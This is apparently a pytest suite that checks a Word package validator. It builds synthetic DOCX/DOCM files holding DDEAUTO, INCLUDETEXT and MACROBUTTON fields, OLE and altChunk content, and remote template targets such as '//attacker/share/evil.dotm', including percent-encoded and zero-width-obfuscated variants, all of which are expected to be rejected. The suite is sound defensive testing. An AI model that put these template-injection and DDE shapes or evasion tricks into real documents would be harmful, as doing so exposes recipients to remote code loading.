"""Phase C adjudication RED matrix: pre-COM authority and package identity.

These tests pin the invariants that decide which bytes the privileged Word
boundary is allowed to interpret:

* the authoritative main part is the one ``_rels/.rels`` resolves to, not the
  one that happens to be named ``word/document.xml``;
* relationship parsing is namespace-bounded and attribute-unambiguous;
* ``TargetMode`` is a closed enumeration, never normalised toward a permitted
  value;
* the authoritative DOCM bytes reach the local Word worker unmodified.
"""

from __future__ import annotations

from pathlib import Path
from zipfile import ZIP_DEFLATED, ZipFile

import pytest

from scripts.backend_contract import delivery_renderer
from scripts.backend_contract.infrastructure import office_word_worker


_CONTENT_TYPES_NS = "http://schemas.openxmlformats.org/package/2006/content-types"
_TRANSITIONAL_RELS_NS = "http://schemas.openxmlformats.org/package/2006/relationships"
_STRICT_RELS_NS = "http://purl.oclc.org/ooxml/package/relationships"
_OFFICE_DOCUMENT_TYPE = (
    "http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument"
)
_DOCX_MAIN_TYPE = (
    "application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"
)
_DOCM_MAIN_TYPE = "application/vnd.ms-word.document.macroEnabled.main+xml"


def _content_types(overrides: dict[str, str], *, defaults: dict[str, str] | None = None) -> str:
    declared = {
        "rels": "application/vnd.openxmlformats-package.relationships+xml",
        "xml": "application/xml",
        **(defaults or {}),
    }
    entries = "".join(
        f'<Default Extension="{extension}" ContentType="{content_type}"/>'
        for extension, content_type in declared.items()
    ) + "".join(
        f'<Override PartName="{part}" ContentType="{content_type}"/>'
        for part, content_type in overrides.items()
    )
    return (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        f'<Types xmlns="{_CONTENT_TYPES_NS}">{entries}</Types>'
    )


def _package_rels(target: str, *, namespace: str = _TRANSITIONAL_RELS_NS, extra: str = "") -> str:
    return (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        f'<Relationships xmlns="{namespace}">'
        f'<Relationship Id="rId1" Type="{_OFFICE_DOCUMENT_TYPE}" Target="{target}"/>'
        f"{extra}</Relationships>"
    )


def _document(body: str = "<w:p><w:r><w:t>Sintetico</w:t></w:r></w:p>") -> str:
    return (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
        f"<w:body>{body}<w:sectPr/></w:body></w:document>"
    )


_ACQUIRING_BODY = (
    "<w:p><w:r><w:instrText> DDEAUTO Excel System Comando </w:instrText></w:r></w:p>"
)


def _write_package(path: Path, parts: dict[str, str]) -> Path:
    with ZipFile(path, "w", ZIP_DEFLATED) as package:
        for name, value in parts.items():
            package.writestr(name, value)
    return path


def _minimal_docx_parts(main_type: str = _DOCX_MAIN_TYPE) -> dict[str, str]:
    return {
        "[Content_Types].xml": _content_types({"/word/document.xml": main_type}),
        "_rels/.rels": _package_rels("word/document.xml"),
        "word/document.xml": _document(),
    }


# --- F-01: main part authority -------------------------------------------------


def test_relocated_main_part_with_acquiring_field_is_rejected_before_com(tmp_path: Path) -> None:
    """RED F-01: a decoy ``word/document.xml`` must not launder an active main part."""
    source = _write_package(
        tmp_path / "source.docx",
        {
            "[Content_Types].xml": _content_types(
                {
                    "/word/document.xml": _DOCX_MAIN_TYPE,
                    "/main/document.xml": _DOCX_MAIN_TYPE,
                }
            ),
            "_rels/.rels": _package_rels("main/document.xml"),
            "word/document.xml": _document(),
            "main/document.xml": _document(_ACQUIRING_BODY),
        },
    )
    with pytest.raises(ValueError):
        office_word_worker._validate_word_source(source, "DOCX")


def test_conventional_main_part_package_is_accepted(tmp_path: Path) -> None:
    """Control for F-01: the supported package shape must keep passing."""
    source = _write_package(tmp_path / "source.docx", _minimal_docx_parts())
    office_word_worker._validate_word_source(source, "DOCX")


def test_missing_package_relationship_part_is_rejected(tmp_path: Path) -> None:
    parts = _minimal_docx_parts()
    del parts["_rels/.rels"]
    source = _write_package(tmp_path / "source.docx", parts)
    with pytest.raises(ValueError):
        office_word_worker._validate_word_source(source, "DOCX")


def test_duplicate_office_document_relationship_is_rejected(tmp_path: Path) -> None:
    parts = _minimal_docx_parts()
    parts["_rels/.rels"] = _package_rels(
        "word/document.xml",
        extra=(
            f'<Relationship Id="rId2" Type="{_OFFICE_DOCUMENT_TYPE}" '
            'Target="word/document.xml"/>'
        ),
    )
    source = _write_package(tmp_path / "source.docx", parts)
    with pytest.raises(ValueError):
        office_word_worker._validate_word_source(source, "DOCX")


def test_absolute_main_part_target_resolves_to_supported_part(tmp_path: Path) -> None:
    """A leading-slash target is the same authoritative part and must be accepted."""
    parts = _minimal_docx_parts()
    parts["_rels/.rels"] = _package_rels("/word/document.xml")
    source = _write_package(tmp_path / "source.docx", parts)
    office_word_worker._validate_word_source(source, "DOCX")


def test_traversal_main_part_target_is_rejected(tmp_path: Path) -> None:
    parts = _minimal_docx_parts()
    parts["_rels/.rels"] = _package_rels("../word/document.xml")
    source = _write_package(tmp_path / "source.docx", parts)
    with pytest.raises(ValueError):
        office_word_worker._validate_word_source(source, "DOCX")


# --- F-06: relationship namespace bounding -------------------------------------


def test_strict_namespace_external_relationship_is_rejected_by_worker(tmp_path: Path) -> None:
    parts = _minimal_docx_parts()
    parts["word/_rels/document.xml.rels"] = (
        f'<Relationships xmlns="{_STRICT_RELS_NS}">'
        '<Relationship Id="rId9" Type="http://purl.oclc.org/ooxml/officeDocument/'
        'relationships/image" Target="http://synthetic.invalid/x.png" '
        'TargetMode="External"/></Relationships>'
    )
    source = _write_package(tmp_path / "source.docx", parts)
    with pytest.raises(ValueError):
        office_word_worker._validate_word_source(source, "DOCX")


def test_unknown_relationship_namespace_fails_closed(tmp_path: Path) -> None:
    parts = _minimal_docx_parts()
    parts["word/_rels/document.xml.rels"] = (
        '<Relationships xmlns="http://synthetic.invalid/relationships">'
        '<Relationship Id="rId9" Type="http://synthetic.invalid/image" '
        'Target="x.png"/></Relationships>'
    )
    source = _write_package(tmp_path / "source.docx", parts)
    with pytest.raises(ValueError):
        office_word_worker._validate_word_source(source, "DOCX")


def test_strict_namespace_external_relationship_is_rejected_by_delivery(tmp_path: Path) -> None:
    """RED F-06: ``validate_final_artifact`` iterated relationships namespace-exact."""
    parts = _minimal_docx_parts()
    parts["word/_rels/document.xml.rels"] = (
        f'<Relationships xmlns="{_STRICT_RELS_NS}">'
        '<Relationship Id="rId9" Type="http://purl.oclc.org/ooxml/officeDocument/'
        'relationships/hyperlink" Target="http://synthetic.invalid/x" '
        'TargetMode="External"/></Relationships>'
    )
    content = _write_package(tmp_path / "delivery.docx", parts).read_bytes()
    with pytest.raises(ValueError):
        delivery_renderer.validate_final_artifact(content, "DOCX")


def test_namespaced_duplicate_target_mode_attribute_is_rejected_by_delivery(
    tmp_path: Path,
) -> None:
    parts = _minimal_docx_parts()
    parts["word/_rels/document.xml.rels"] = (
        f'<Relationships xmlns="{_TRANSITIONAL_RELS_NS}" xmlns:x="http://synthetic.invalid/x">'
        '<Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/'
        '2006/relationships/hyperlink" Target="http://synthetic.invalid/x" '
        'TargetMode="Internal" x:TargetMode="External"/></Relationships>'
    )
    content = _write_package(tmp_path / "delivery.docx", parts).read_bytes()
    with pytest.raises(ValueError):
        delivery_renderer.validate_final_artifact(content, "DOCX")


# --- F-07: TargetMode closed enumeration ---------------------------------------


@pytest.mark.parametrize(
    "mode",
    [" External", "EXTERNAL ", "Externall", "", "external", "internal", "INTERNAL", " Internal "],
)
def test_noncanonical_target_mode_fails_closed(tmp_path: Path, mode: str) -> None:
    parts = _minimal_docx_parts()
    parts["word/_rels/document.xml.rels"] = (
        f'<Relationships xmlns="{_TRANSITIONAL_RELS_NS}">'
        '<Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/'
        f'2006/relationships/image" Target="synthetic.png" TargetMode="{mode}"/>'
        "</Relationships>"
    )
    source = _write_package(tmp_path / "source.docx", parts)
    with pytest.raises(ValueError):
        office_word_worker._validate_word_source(source, "DOCX")


def test_canonical_internal_target_mode_is_accepted(tmp_path: Path) -> None:
    parts = _minimal_docx_parts()
    parts["word/_rels/document.xml.rels"] = (
        f'<Relationships xmlns="{_TRANSITIONAL_RELS_NS}">'
        '<Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/'
        '2006/relationships/image" Target="media/synthetic.png" TargetMode="Internal"/>'
        "</Relationships>"
    )
    parts["word/media/synthetic.png"] = "synthetic"
    parts["[Content_Types].xml"] = _content_types(
        {"/word/document.xml": _DOCX_MAIN_TYPE}, defaults={"png": "image/png"}
    )
    source = _write_package(tmp_path / "source.docx", parts)
    office_word_worker._validate_word_source(source, "DOCX")


def test_undeclared_package_part_fails_closed(tmp_path: Path) -> None:
    parts = _minimal_docx_parts()
    parts["word/media/synthetic.png"] = "synthetic"
    source = _write_package(tmp_path / "source.docx", parts)
    with pytest.raises(ValueError):
        office_word_worker._validate_word_source(source, "DOCX")


# --- F-08 (pre-COM surface): active content sweep must not rely on part names ---


def test_acquiring_field_outside_word_prefix_is_rejected(tmp_path: Path) -> None:
    """A WordprocessingML part declared by content type must be swept wherever it lives."""
    parts = _minimal_docx_parts()
    parts["[Content_Types].xml"] = _content_types(
        {
            "/word/document.xml": _DOCX_MAIN_TYPE,
            "/extra/header.xml": (
                "application/vnd.openxmlformats-officedocument."
                "wordprocessingml.header+xml"
            ),
        }
    )
    parts["extra/header.xml"] = _document(_ACQUIRING_BODY)
    source = _write_package(tmp_path / "source.docx", parts)
    with pytest.raises(ValueError):
        office_word_worker._validate_word_source(source, "DOCX")


# --- F-02: authoritative DOCM bytes reach the worker unmodified ----------------


class _SpyConverter:
    """Captures exactly what the production path hands to the local Word worker."""

    renderer_type = "MICROSOFT_WORD_DESKTOP_COM"

    def __init__(self) -> None:
        self.received: tuple[bytes, str] | None = None

    def convert(self, content: bytes, source_format: str) -> bytes:
        self.received = (content, source_format)
        raise RuntimeError("synthetic stop after capture")


def _docm_bytes(tmp_path: Path) -> bytes:
    parts = _minimal_docx_parts(_DOCM_MAIN_TYPE)
    parts["word/vbaProject.bin"] = "synthetic-vba"
    parts["word/_rels/document.xml.rels"] = (
        f'<Relationships xmlns="{_TRANSITIONAL_RELS_NS}">'
        '<Relationship Id="rId8" Type="http://schemas.microsoft.com/office/2006/'
        'relationships/vbaProject" Target="vbaProject.bin"/></Relationships>'
    )
    parts["[Content_Types].xml"] = _content_types(
        {
            "/word/document.xml": _DOCM_MAIN_TYPE,
            "/word/vbaProject.bin": "application/vnd.ms-office.vbaProject",
        }
    )
    return _write_package(tmp_path / "authoritative.docm", parts).read_bytes()


def test_docm_reaches_converter_as_exact_authoritative_bytes(tmp_path: Path) -> None:
    """RED F-02: the production path rewrote DOCM into a substitute DOCX."""
    authoritative = _docm_bytes(tmp_path)
    spy = _SpyConverter()
    with pytest.raises(ValueError):
        delivery_renderer.render_final_pdf_candidate(
            word_content=authoritative, word_format="DOCM", converter=spy
        )
    assert spy.received is not None
    assert spy.received[1] == "DOCM"
    assert spy.received[0] == authoritative


def test_docx_reaches_converter_as_exact_authoritative_bytes(tmp_path: Path) -> None:
    """Control: the DOCX path was already a pass-through and must stay one."""
    authoritative = _write_package(
        tmp_path / "authoritative.docx", _minimal_docx_parts()
    ).read_bytes()
    spy = _SpyConverter()
    with pytest.raises(ValueError):
        delivery_renderer.render_final_pdf_candidate(
            word_content=authoritative, word_format="DOCX", converter=spy
        )
    assert spy.received is not None
    assert spy.received[1] == "DOCX"
    assert spy.received[0] == authoritative


# --- Phase C §27: OPC part names compare case-insensitively ---


@pytest.mark.parametrize("name", ("word/_rels/settings.xml.RELS", "word/_rels/settings.xml.Rels"))
def test_case_variant_relationship_part_is_still_swept(tmp_path: Path, name: str) -> None:
    """P0: a ".RELS" part is the same part to Word, and bypassed the whole policy."""
    parts = _minimal_docx_parts()
    parts[name] = (
        f'<Relationships xmlns="{_TRANSITIONAL_RELS_NS}">'
        '<Relationship Id="rIdT" Type="http://schemas.openxmlformats.org/officeDocument/'
        '2006/relationships/attachedTemplate" Target="//attacker/share/evil.dotm" '
        'TargetMode="External"/></Relationships>'
    )
    source = _write_package(tmp_path / "source.docx", parts)
    with pytest.raises(ValueError):
        office_word_worker._validate_word_source(source, "DOCX")

    with pytest.raises(ValueError):
        delivery_renderer.validate_final_artifact(source.read_bytes(), "DOCX")


def test_part_names_colliding_only_by_case_are_rejected(tmp_path: Path) -> None:
    parts = _minimal_docx_parts()
    parts["word/Document.xml"] = _document()
    source = _write_package(tmp_path / "source.docx", parts)
    with pytest.raises(ValueError, match="duplicate Word package part"):
        office_word_worker._validate_word_source(source, "DOCX")


def test_delivery_rejects_a_local_target_declared_internal(tmp_path: Path) -> None:
    """The delivered artifact must not carry a target that resolves off-box."""
    parts = _minimal_docx_parts()
    parts["word/_rels/document.xml.rels"] = (
        f'<Relationships xmlns="{_TRANSITIONAL_RELS_NS}">'
        '<Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/'
        '2006/relationships/image" Target="//evil-host/share/logo.png" '
        'TargetMode="Internal"/></Relationships>'
    )
    content = _write_package(tmp_path / "delivery.docx", parts).read_bytes()
    with pytest.raises(ValueError, match="external relationships"):
        delivery_renderer.validate_final_artifact(content, "DOCX")


def test_zip_directory_entries_do_not_read_as_undeclared(tmp_path: Path) -> None:
    source = tmp_path / "source.docx"
    with ZipFile(source, "w", ZIP_DEFLATED) as package:
        for name, value in _minimal_docx_parts().items():
            package.writestr(name, value)
        package.writestr("word/", "")
    office_word_worker._validate_word_source(source, "DOCX")


# --- Phase C §27 round 2: OPC part-name casing and encoded targets ---


def test_case_variant_content_type_override_still_sweeps_the_part(tmp_path: Path) -> None:
    """P0: an Override differing only in case is the same part to Word."""
    parts = _minimal_docx_parts()
    parts["[Content_Types].xml"] = _content_types(
        {
            "/word/document.xml": _DOCX_MAIN_TYPE,
            "/Parts/Header1.xml": (
                "application/vnd.openxmlformats-officedocument."
                "wordprocessingml.header+xml"
            ),
        }
    )
    parts["parts/header1.xml"] = (
        '<w:hdr xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
        '<w:p><w:fldSimple w:instr=" INCLUDETEXT x.docx "/></w:p></w:hdr>'
    )
    source = _write_package(tmp_path / "source.docx", parts)

    with pytest.raises(ValueError):
        office_word_worker._validate_word_source(source, "DOCX")


@pytest.mark.parametrize(
    "target",
    (
        "%5C%5Cevil%5Cshare%5Cx.dotm",
        "http%3A%2F%2Fevil%2Fx",
        "%255C%255Cevil%255Cshare",
        "\u200bhttp://evil/x",
    ),
)
def test_encoded_external_target_is_rejected_by_both_validators(
    tmp_path: Path, target: str
) -> None:
    """OPC targets are URI references, so Word decodes them before resolving."""
    parts = _minimal_docx_parts()
    parts["word/_rels/document.xml.rels"] = (
        f'<Relationships xmlns="{_TRANSITIONAL_RELS_NS}">'
        '<Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/'
        f'2006/relationships/image" Target="{target}"/></Relationships>'
    )
    source = _write_package(tmp_path / "source.docx", parts)

    with pytest.raises(ValueError):
        office_word_worker._validate_word_source(source, "DOCX")
    with pytest.raises(ValueError):
        delivery_renderer.validate_final_artifact(source.read_bytes(), "DOCX")


def test_ordinary_internal_targets_are_still_accepted(tmp_path: Path) -> None:
    parts = _minimal_docx_parts()
    parts["word/_rels/document.xml.rels"] = (
        f'<Relationships xmlns="{_TRANSITIONAL_RELS_NS}">'
        '<Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/'
        '2006/relationships/image" Target="media/logo%20oficial.png"/></Relationships>'
    )
    parts["word/media/logo oficial.png"] = "synthetic"
    parts["[Content_Types].xml"] = _content_types(
        {"/word/document.xml": _DOCX_MAIN_TYPE}, defaults={"png": "image/png"}
    )
    source = _write_package(tmp_path / "source.docx", parts)

    office_word_worker._validate_word_source(source, "DOCX")


# --- Phase C §27 round 3: the two boundaries must reach the same verdict ---


_ACQUIRING_PAYLOADS = {
    "dde_field": (
        "<w:p><w:r><w:fldSimple "
        'w:instr=" DDEAUTO Excel System Comando "/></w:r></w:p>'
    ),
    "includetext_field": (
        '<w:p><w:r><w:fldSimple w:instr=" INCLUDETEXT outro.docx "/></w:r></w:p>'
    ),
    "alt_chunk": '<w:altChunk r:id="rIdChunk"/>',
    "ole_object": "<w:p><w:r><w:object/></w:r></w:p>",
}


@pytest.mark.parametrize("payload", sorted(_ACQUIRING_PAYLOADS))
def test_both_boundaries_reject_the_same_active_content(
    tmp_path: Path, payload: str
) -> None:
    """The render path has no production caller, so delivery is the only gate.

    Both validators must therefore reach the same verdict on the same package.
    """
    parts = _minimal_docx_parts()
    parts["word/document.xml"] = _document(_ACQUIRING_PAYLOADS[payload])
    source = _write_package(tmp_path / "source.docx", parts)

    with pytest.raises(ValueError):
        office_word_worker._validate_word_source(source, "DOCX")
    with pytest.raises(ValueError):
        delivery_renderer.validate_final_artifact(source.read_bytes(), "DOCX")


def test_both_boundaries_reject_an_attached_template_relationship(
    tmp_path: Path,
) -> None:
    parts = _minimal_docx_parts()
    parts["word/_rels/document.xml.rels"] = (
        f'<Relationships xmlns="{_TRANSITIONAL_RELS_NS}">'
        '<Relationship Id="rIdT" Type="http://schemas.openxmlformats.org/officeDocument/'
        '2006/relationships/attachedTemplate" Target="modelo.dotm"/></Relationships>'
    )
    parts["word/modelo.dotm"] = "synthetic"
    parts["[Content_Types].xml"] = _content_types(
        {"/word/document.xml": _DOCX_MAIN_TYPE},
        defaults={"dotm": "application/vnd.ms-word.template.macroEnabled.12"},
    )
    source = _write_package(tmp_path / "source.docx", parts)

    with pytest.raises(ValueError):
        office_word_worker._validate_word_source(source, "DOCX")
    with pytest.raises(ValueError):
        delivery_renderer.validate_final_artifact(source.read_bytes(), "DOCX")


def test_both_boundaries_reject_case_only_part_collisions(tmp_path: Path) -> None:
    parts = _minimal_docx_parts()
    parts["word/Document.xml"] = _document()
    source = _write_package(tmp_path / "source.docx", parts)

    with pytest.raises(ValueError, match="duplicate Word package part"):
        office_word_worker._validate_word_source(source, "DOCX")
    with pytest.raises(ValueError, match="duplicate Word package part"):
        delivery_renderer.validate_final_artifact(source.read_bytes(), "DOCX")


def test_both_boundaries_accept_the_supported_package(tmp_path: Path) -> None:
    source = _write_package(tmp_path / "source.docx", _minimal_docx_parts())

    office_word_worker._validate_word_source(source, "DOCX")
    delivery_renderer.validate_final_artifact(source.read_bytes(), "DOCX")


# --- Phase C §27 round 4: a field code is judged per field, not per paragraph ---
#
# ``w:instrText`` only means anything between a ``w:fldChar`` "begin" and the
# "end" that closes it, and one paragraph may carry several fields.  The sweep
# concatenated a whole paragraph and read the first code with ``re.match``, so a
# leading ``{ PAGE }`` presented an allow-listed code while a second, unlisted
# field rode along behind it.  Reproduced for ten codes.  The denylist hid the
# gap: it uses ``search``, so it still caught DDEAUTO in second position while
# the allowlist -- the primary control -- was fully bypassed.


def _field(code: str) -> str:
    """A field as Word writes it: begin / instruction / separate / result / end."""
    return (
        '<w:r><w:fldChar w:fldCharType="begin"/></w:r>'
        f'<w:r><w:instrText xml:space="preserve"> {code} </w:instrText></w:r>'
        '<w:r><w:fldChar w:fldCharType="separate"/></w:r>'
        "<w:r><w:t>1</w:t></w:r>"
        '<w:r><w:fldChar w:fldCharType="end"/></w:r>'
    )


_UNLISTED_FIELD_CODES = (
    "AUTOTEXT Assinatura",
    "AUTOTEXTLIST Lista",
    "DDEAUTO Excel System Comando",
    "DOCVARIABLE Segredo",
    "EMBED Excel.Sheet.12",
    "FILLIN Pergunta",
    "GOTOBUTTON Alvo Rotulo",
    "IMPORT grafico.png",
    "INCLUDE relatorio.docx",
    "INCLUDETEXT outro.docx",
    "MACROBUTTON AcaoX Rotulo",
    "PRINT Comando",
)
_SAFE_FIELD_CODES = ("PAGE", "NUMPAGES", "SEQ Figura", "REF Marca", "PAGEREF Marca")


def _body_parts(body: str) -> dict[str, str]:
    parts = _minimal_docx_parts()
    parts["word/document.xml"] = _document(body)
    return parts


@pytest.mark.parametrize("code", _UNLISTED_FIELD_CODES)
def test_unlisted_field_is_rejected_on_its_own(tmp_path: Path, code: str) -> None:
    source = _write_package(tmp_path / "source.docx", _body_parts("<w:p>" + _field(code) + "</w:p>"))

    with pytest.raises(ValueError):
        office_word_worker._validate_word_source(source, "DOCX")


@pytest.mark.parametrize("code", _UNLISTED_FIELD_CODES)
def test_unlisted_field_is_rejected_behind_a_safe_field(tmp_path: Path, code: str) -> None:
    """Two real fields in one paragraph; Word executes both."""
    body = "<w:p>" + _field("PAGE") + _field(code) + "</w:p>"
    source = _write_package(tmp_path / "source.docx", _body_parts(body))

    with pytest.raises(ValueError):
        office_word_worker._validate_word_source(source, "DOCX")


@pytest.mark.parametrize("code", _SAFE_FIELD_CODES)
def test_allow_listed_field_is_still_accepted(tmp_path: Path, code: str) -> None:
    source = _write_package(tmp_path / "source.docx", _body_parts("<w:p>" + _field(code) + "</w:p>"))

    office_word_worker._validate_word_source(source, "DOCX")


def test_a_field_spanning_paragraphs_is_read_as_one_field(tmp_path: Path) -> None:
    """A TOC field routinely spans paragraphs; segmenting per paragraph would
    see an unclosed begin and must not turn that into a false rejection."""
    body = (
        '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r>'
        '<w:r><w:instrText xml:space="preserve"> TOC </w:instrText></w:r></w:p>'
        r'<w:p><w:r><w:instrText xml:space="preserve">\o "1-3" </w:instrText></w:r>'
        '<w:r><w:fldChar w:fldCharType="separate"/></w:r></w:p>'
        "<w:p><w:r><w:t>Sumario</w:t></w:r></w:p>"
        '<w:p><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>'
    )
    source = _write_package(tmp_path / "source.docx", _body_parts(body))

    office_word_worker._validate_word_source(source, "DOCX")


def test_a_nested_field_is_judged_on_its_own_code(tmp_path: Path) -> None:
    body = (
        "<w:p>"
        '<w:r><w:fldChar w:fldCharType="begin"/></w:r>'
        '<w:r><w:instrText xml:space="preserve"> PAGE </w:instrText></w:r>'
        '<w:r><w:fldChar w:fldCharType="begin"/></w:r>'
        '<w:r><w:instrText xml:space="preserve"> MACROBUTTON AcaoX Rotulo </w:instrText></w:r>'
        '<w:r><w:fldChar w:fldCharType="end"/></w:r>'
        '<w:r><w:fldChar w:fldCharType="end"/></w:r>'
        "</w:p>"
    )
    source = _write_package(tmp_path / "source.docx", _body_parts(body))

    with pytest.raises(ValueError):
        office_word_worker._validate_word_source(source, "DOCX")


def test_instruction_text_outside_any_field_is_still_judged(tmp_path: Path) -> None:
    """Bare instrText is not a field to Word, but it cannot be dropped silently."""
    source = _write_package(tmp_path / "source.docx", _body_parts(_ACQUIRING_BODY))

    with pytest.raises(ValueError):
        office_word_worker._validate_word_source(source, "DOCX")


# --- Phase C §27 round 4: boundary parity is decided by a shared catalogue ---
#
# One policy was stated twice with different content: the worker runs an
# allowlist over package shape and field codes, delivery ran a seven-name
# denylist over parts picked by the literal prefix "word/".  Every divergence
# below was reproduced before being repaired.
#
# The policy is restated rather than shared because delivery must not import
# the contained worker: that module imports winreg at module level, so the edge
# would make the delivery boundary Windows-only and would invert the direction
# of the containment.  Restating is only sound while drift is observable, which
# is what this catalogue is for -- both boundaries are asked for a verdict on
# the same bytes, and the expected verdict is pinned.


def _bin_types() -> dict[str, str]:
    return {"bin": "application/vnd.openxmlformats-officedocument.oleObject"}


def _parity_catalogue() -> dict[str, tuple[str, dict[str, str]]]:
    entries: dict[str, tuple[str, dict[str, str]]] = {
        "supported_package": ("accept", _minimal_docx_parts()),
        "ole_object_element": (
            "reject",
            _body_parts("<w:p><w:r><w:object/></w:r></w:p>"),
        ),
    }

    relocated = {
        "[Content_Types].xml": _content_types(
            {"/word/document.xml": _DOCX_MAIN_TYPE, "/main/document.xml": _DOCX_MAIN_TYPE}
        ),
        "_rels/.rels": _package_rels("main/document.xml"),
        "word/document.xml": _document(),
        "main/document.xml": _document(_ACQUIRING_BODY),
    }
    entries["relocated_main_part"] = ("reject", relocated)

    orphaned = _minimal_docx_parts()
    del orphaned["_rels/.rels"]
    entries["no_package_relationships"] = ("reject", orphaned)

    outside = _minimal_docx_parts()
    outside["extra/header.xml"] = _document(_ACQUIRING_BODY)
    outside["[Content_Types].xml"] = _content_types(
        {"/word/document.xml": _DOCX_MAIN_TYPE, "/extra/header.xml": _DOCX_MAIN_TYPE}
    )
    entries["acquiring_field_outside_word_prefix"] = ("reject", outside)

    for label, part in (
        ("ole_embedding_part", "word/embeddings/oleObject1.bin"),
        ("activex_part", "word/activeX/activeX1.bin"),
    ):
        parts = _minimal_docx_parts()
        parts[part] = "synthetic"
        parts["[Content_Types].xml"] = _content_types(
            {"/word/document.xml": _DOCX_MAIN_TYPE}, defaults=_bin_types()
        )
        entries[label] = ("reject", parts)

    undeclared = _minimal_docx_parts()
    undeclared["word/media/logo.png"] = "synthetic"
    entries["undeclared_part"] = ("reject", undeclared)

    traversal = _minimal_docx_parts()
    traversal["../evil.xml"] = _document()
    entries["part_name_traversal"] = ("reject", traversal)

    importable = _minimal_docx_parts()
    importable["word/relatorio.htm"] = "<html><body>sintetico</body></html>"
    importable["[Content_Types].xml"] = _content_types(
        {"/word/document.xml": _DOCX_MAIN_TYPE}, defaults={"htm": "text/html"}
    )
    entries["importable_part"] = ("reject", importable)

    # Three shapes where the boundaries disagreed with nothing observing it.
    # In two of them the delivery reading is the OPC-correct one and the worker
    # was the stricter side, which is still a divergence: a template the worker
    # refuses cannot reach the renderer at all.
    dot_segment = _minimal_docx_parts()
    dot_segment["_rels/.rels"] = _package_rels("word/extra/../document.xml")
    entries["main_part_target_with_dot_segment"] = ("accept", dot_segment)

    macro_in_docx = _minimal_docx_parts()
    macro_in_docx["word/vbaProject.bin"] = "synthetic"
    macro_in_docx["[Content_Types].xml"] = _content_types(
        {
            "/word/document.xml": _DOCX_MAIN_TYPE,
            "/word/vbaProject.bin": "application/vnd.ms-office.vbaProject",
        }
    )
    entries["docx_carrying_a_macro_part"] = ("reject", macro_in_docx)

    upper_override = _minimal_docx_parts()
    upper_override["[Content_Types].xml"] = _content_types(
        {"/WORD/DOCUMENT.XML": _DOCX_MAIN_TYPE}
    )
    entries["override_part_name_in_upper_case"] = ("accept", upper_override)

    for code in _SAFE_FIELD_CODES:
        name = code.split()[0].casefold()
        entries[f"safe_field_{name}"] = (
            "accept",
            _body_parts("<w:p>" + _field(code) + "</w:p>"),
        )
    for code in _UNLISTED_FIELD_CODES:
        name = code.split()[0].casefold()
        entries[f"unlisted_field_{name}"] = (
            "reject",
            _body_parts("<w:p>" + _field(code) + "</w:p>"),
        )
        entries[f"unlisted_field_{name}_behind_page"] = (
            "reject",
            _body_parts("<w:p>" + _field("PAGE") + _field(code) + "</w:p>"),
        )
        entries[f"unlisted_field_{name}_after_separator"] = (
            "reject",
            _body_parts(
                "<w:p>"
                + '<w:r><w:fldChar w:fldCharType="begin"/></w:r>'
                + '<w:r><w:instrText xml:space="preserve"> PAGE </w:instrText></w:r>'
                + '<w:r><w:fldChar w:fldCharType="separate"/></w:r>'
                + f'<w:r><w:instrText xml:space="preserve"> {code} </w:instrText></w:r>'
                + '<w:r><w:fldChar w:fldCharType="end"/></w:r>'
                + "</w:p>"
            ),
        )
    return entries


_PARITY_CATALOGUE = _parity_catalogue()


@pytest.mark.parametrize("label", sorted(_PARITY_CATALOGUE))
def test_both_boundaries_reach_the_same_verdict(tmp_path: Path, label: str) -> None:
    expected, parts = _PARITY_CATALOGUE[label]
    source = _write_package(tmp_path / "source.docx", parts)

    try:
        office_word_worker._validate_word_source(source, "DOCX")
        worker = "accept"
    except ValueError:
        worker = "reject"
    try:
        delivery_renderer.validate_final_artifact(source.read_bytes(), "DOCX")
        delivery = "accept"
    except ValueError:
        delivery = "reject"

    assert (worker, delivery) == (expected, expected), (
        f"{label}: worker={worker} delivery={delivery} expected={expected}"
    )


# --- Phase C §27 round 4: target spellings must be closed, not applied once ---
#
# Percent-decoding and invisible-character stripping ran once each, in that
# order, so a zero-width character *inside* an escape broke the escape for the
# decoder and was only removed afterwards, when nothing decoded it again.  The
# escapes are also octets: a URI decoder reads them as UTF-8, so "%E2%80%8B" is
# itself a zero-width space that the byte-wise decoder never produced.

_ZWSP = chr(0x200B)
_ENCODED_EXTERNAL_TARGETS = (
    "%5C%5Cservidor%5Cshare",
    "%255C%255Cservidor",
    "http%3A%2F%2Fexemplo/parte",
    _ZWSP + "%5C%5Cservidor",
    "%" + _ZWSP + "5C%" + _ZWSP + "5Cservidor",
    "%25" + _ZWSP + "5C%255Cservidor",
    "%E2%80%8B%5C%5Cservidor",
    "%2525255C%2525255Cservidor",
)
_LOCAL_TARGETS = (
    "media/logo.png",
    "media/logo%20oficial.png",
    "../media/logo.png",
    "word/document.xml",
)


@pytest.mark.parametrize("target", _ENCODED_EXTERNAL_TARGETS)
def test_encoded_external_target_is_external_at_both_boundaries(target: str) -> None:
    assert office_word_worker._looks_external(target) is True
    assert delivery_renderer._looks_external(target) is True


@pytest.mark.parametrize("target", _LOCAL_TARGETS)
def test_local_target_stays_internal_at_both_boundaries(target: str) -> None:
    assert office_word_worker._looks_external(target) is False
    assert delivery_renderer._looks_external(target) is False


# --- Phase C §27 round 5: an instruction ends at w:separate ---------------------
#
# Segmentation moved from paragraph to field but kept "one instruction is
# everything between begin and end".  A field has two regions and w:separate is
# the boundary, so concatenating across it rebuilt the defect inside a single
# field: { PAGE <separate> MACROBUTTON ... } presented an allow-listed leading
# code and the unlisted one rode along behind it.  The module comment asserted
# that the result carries only w:t; nothing enforced it, and an assertion in a
# comment is not a control.
#
# The same shape held for instruction text belonging to no field: every bare node
# went into one buffer whose leading code spoke for all of them.


